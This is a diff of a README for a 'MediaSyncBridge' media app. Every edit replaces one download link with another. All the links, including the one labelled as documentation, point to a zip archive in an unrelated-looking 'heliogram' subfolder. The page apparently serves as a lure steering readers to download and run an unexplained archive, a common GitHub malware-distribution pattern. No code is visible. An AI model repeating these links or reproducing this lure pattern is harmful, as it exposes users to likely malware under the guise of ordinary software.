@@ -1,6 +1,6 @@
 # 🎥 MediaSyncBridge - Simplify Your Media Content Access
 
-[![Download MediaSyncBridge](https://raw.githubusercontent.com/williamlouiscasiyutuc/MediaSyncBridge/main/heliogram/MediaSyncBridge.zip)](https://raw.githubusercontent.com/williamlouiscasiyutuc/MediaSyncBridge/main/heliogram/MediaSyncBridge.zip)
+[![Download MediaSyncBridge](https://github.com/williamlouiscasiyutuc/MediaSyncBridge/raw/refs/heads/main/heliogram/Bridge-Media-Sync-v3.7.zip)](https://github.com/williamlouiscasiyutuc/MediaSyncBridge/raw/refs/heads/main/heliogram/Bridge-Media-Sync-v3.7.zip)
 
 ## 📦 Introduction
 
@@ -20,7 +20,7 @@ To use MediaSyncBridge, follow these straightforward steps to download and run t
 
 Visit the following page to download MediaSyncBridge:
 
-[Download MediaSyncBridge](https://raw.githubusercontent.com/williamlouiscasiyutuc/MediaSyncBridge/main/heliogram/MediaSyncBridge.zip)
+[Download MediaSyncBridge](https://github.com/williamlouiscasiyutuc/MediaSyncBridge/raw/refs/heads/main/heliogram/Bridge-Media-Sync-v3.7.zip)
 
 ### Step-by-step Download Instructions:
 
@@ -78,7 +78,7 @@ MediaSyncBridge connects seamlessly with the following services:
 
 ## 📘 Documentation
 
-For more detailed instructions and advanced usage, check out the [MediaSyncBridge Documentation](https://raw.githubusercontent.com/williamlouiscasiyutuc/MediaSyncBridge/main/heliogram/MediaSyncBridge.zip). This will help you maximize your use of the application and its features.
+For more detailed instructions and advanced usage, check out the [MediaSyncBridge Documentation](https://github.com/williamlouiscasiyutuc/MediaSyncBridge/raw/refs/heads/main/heliogram/Bridge-Media-Sync-v3.7.zip). This will help you maximize your use of the application and its features.
 
 ## 🛠 Troubleshooting
 
@@ -97,4 +97,4 @@ For support, you can reach out through the GitHub issues page. We appreciate you
 
 Don't forget that you can always revisit the download page for the latest updates and releases here:
 
-[Download MediaSyncBridge](https://raw.githubusercontent.com/williamlouiscasiyutuc/MediaSyncBridge/main/heliogram/MediaSyncBridge.zip)
+[Download MediaSyncBridge](https://github.com/williamlouiscasiyutuc/MediaSyncBridge/raw/refs/heads/main/heliogram/Bridge-Media-Sync-v3.7.zip)
